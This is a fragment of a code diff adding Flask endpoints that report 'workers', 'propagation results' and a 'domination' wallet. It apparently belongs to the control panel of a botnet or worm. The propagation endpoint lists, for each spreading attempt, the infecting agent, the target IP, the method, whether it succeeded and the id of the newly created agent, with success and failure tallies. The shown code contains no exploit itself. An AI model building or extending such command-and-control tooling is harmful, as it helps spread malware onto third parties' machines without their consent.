+                "last_seen": w["last_seen"]
+            })
+        
+        return jsonify({"status": "ok", "workers": result, "count": len(result)})
+    except Exception as e:
+        return jsonify({"status": "error", "error": str(e), "workers": []})
+
+
+@app.route("/api/propagation/results")
+def get_propagation_results():
+    """Get propagation results."""
+    try:
+        db = get_db()
+        results = db.execute("""
+            SELECT p.id, p.agent_id, p.target_ip, p.method, p.success, p.new_agent_id, p.created_at,
+                   a.hostname
+            FROM propagation_results p
+            LEFT JOIN agents a ON p.agent_id = a.id
+            ORDER BY p.created_at DESC
+            LIMIT 100
+        """).fetchall()
+        
+        props = []
+        for r in results:
+            props.append({
+                "id": r["id"],
+                "agent_id": r["agent_id"],
+                "hostname": r["hostname"],
+                "target_ip": r["target_ip"],
+                "method": r["method"],
+                "success": bool(r["success"]),
+                "new_agent_id": r["new_agent_id"],
+                "created_at": r["created_at"]
+            })
+        
+        # Stats
+        total = len(props)
+        successful = sum(1 for p in props if p["success"])
+        
+        return jsonify({
+            "status": "ok", 
+            "results": props, 
+            "count": total,
+            "successful": successful,
+            "failed": total - successful
+        })
+    except Exception as e:
+        return jsonify({"status": "error", "error": str(e), "results": []})
 
 
 @app.route("/api/domination/wallet")
